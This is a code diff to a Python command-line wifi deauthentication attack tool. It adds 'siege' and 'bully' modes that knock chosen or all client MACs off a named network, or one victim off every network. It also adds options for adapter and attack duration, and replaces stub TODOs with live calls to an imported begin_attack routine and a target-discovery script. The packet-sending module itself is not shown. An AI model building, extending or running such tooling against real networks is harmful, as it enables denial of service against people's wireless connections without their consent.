@@ -1,12 +1,20 @@
 import argparse
+import os
 import re
 import subprocess
 import sys
 
+from de_auth import begin_attack
 import parse_data
 
 
 _mac_address_pattern = re.compile('[0-9A-F]{2}(:[0-9A-F]{2}){5}')
+_duration_multiplier = {
+    's': 1,
+    'm': 60,
+    'h': 60 * 60,
+}
+
 
 def mac_address_or_all(addr):
     if addr.lower() == 'all':
@@ -37,18 +45,27 @@ def ip_address(addr):
     return addr
 
 
+def duration(dur):
+    try:
+        mult = _duration_multiplier[dur[-1]]
+        return int(dur[:-1]) * mult
+    except:
+        raise TypeError('{} does not match a duration pattern'.format(dur))
+
+
 def parse_args():
     parser = argparse.ArgumentParser(description='Deauthenticate targets from a wifi network.')
-    
+
     subparsers = parser.add_subparsers(title="actions", description='valid actions (no action means to deauth a set of targets)', dest='action')
-    deauth_parser = subparsers.add_parser('deauth', help='deauth some set of targets from specified networks')
+    deauth_parser = subparsers.add_parser('siege', help='deauth some set of targets from specified networks')
+    deauth_parser.add_argument('-a', '--adapter', help='the wireless adapter to use (default wlan0mon)', default='wlan0mon')
+    deauth_parser.add_argument('-d', '--attack-duration', type=duration, help='the length in time to conduct this attack (format is 1s for 1 second, 1m for 1 minute, 1h for 1 hour). default is 180s', default=180)
+    deauth_parser.add_argument('essid', help='the name of the network to send deauth packets to')
     deauth_parser.add_argument('target', nargs='+', type=mac_address_or_all, help='the MAC addresses to deauth (use "all" to target everything)')
 
-    network_group = deauth_parser.add_argument_group('network', 'specify the access points to deauth from (required)')
-    network_group.add_argument('-B', '--bssids', action='append', type=mac_address, help='the BSSIDs of the networks to send deauth packets to')
-    network_group.add_argument('-n', '--network-names', '-E', '--essids', '-S', '--ssids', action='append', help='the names of the networks to send deauth packets to', dest='network_names')
-
     bully_parser = subparsers.add_parser('bully', help='deauth a target from all networks')
+    bully_parser.add_argument('-a', '--adapter', help='the wireless adapter to use (default wlan0mon)', default='wlan0mon')
+    bully_parser.add_argument('-d', '--attack-duration', type=duration, help='the length in time to conduct this attack (format is 1s for 1 second, 1m for 1 minute, 1h for 1 hour). default is 180s', default=180)
     bully_parser.add_argument('target', type=mac_address, help='the MAC address to deauth')
 
     discover_parser = subparsers.add_parser('discover', help='locate targets to deauth')
@@ -57,20 +74,17 @@ def parse_args():
     if args.action is None:
         parser.print_help()
         sys.exit(0)
-    if args.action == 'deauth' and not args.bssids and not args.network_names:
-        print('Please specify a network to deauth from', file=sys.stderr)
-        parser.print_usage(file=sys.stderr)
-        sys.exit(1)
     return args
 
 
 def discover_network(args=None):
-    """
-    discovery_results = subprocess.run(['discovery.sh'], stderr=subprocess.PIPE, encoding='utf-8')
+    __location__ = os.path.realpath(
+                os.path.join(os.getcwd(), os.path.dirname(__file__)))
+    discover_script_path = os.path.join(__location__, 'discovery.sh')
+    discovery_results = subprocess.run([discover_script_path], stderr=subprocess.PIPE)
     if discovery_results.returncode != 0:
         print(discovery_results.stderr, file=sys.stderr)
         sys.exit(1)
-    """
     essid_data = parse_data.parse_network_packets(parse_data.get_file_name())
     if args is not None:
         # if args are passed in, then we need to print the data
@@ -85,23 +99,26 @@ def deauth_clients(args):
     target_all = 'all' in args.target
     targets = [] if target_all else [t for t in args.target if t != 'all']
 
-    # networks to send deauth packets too
-    bssids = args.bssids or [] # list of BSSID MAC addresses
-    network_names = args.network_names or [] # list of string network names or None
+    kwargs = {
+        'mode': 'siege',
+        'net_clients': targets,
+        'ESSID': args.essid,
+        'attack_time': args.attack_duration,
+        'wireless_adapter': args.adapter,
+    }
 
     essid_data, inverted_index = discover_network()
 
-    if target_all:
-        targets = list(inverted_index.keys())
-
-    print(targets)
-    print(bssids)
-    print(network_names)
-    # TODO: implement targeting the clients in `targets`
+    begin_attack(essid_data, inverted_index, **kwargs)
 
 
 def bully_target(args):
-    target_mac = args.target # MAC address string or None
+    kwargs = {
+        'mode': 'bully',
+        'victims_mac': args.target,
+        'attack_time': args.attack_duration,
+        'wireless_adapter': args.adapter,
+    }
 
     essid_data, inverted_index = discover_network()
 
@@ -109,13 +126,12 @@ def bully_target(args):
         print('target not found', file=sys.stderr)
         sys.exit(1)
 
-    # TODO: implement bullying
-    print(target_mac)
+    begin_attack(essid_data, inverted_index, **kwargs)
 
 
 def main():
     actions = {
-        'deauth': deauth_clients,
+        'siege': deauth_clients,
         'bully': bully_target,
         'discover': discover_network,
     }
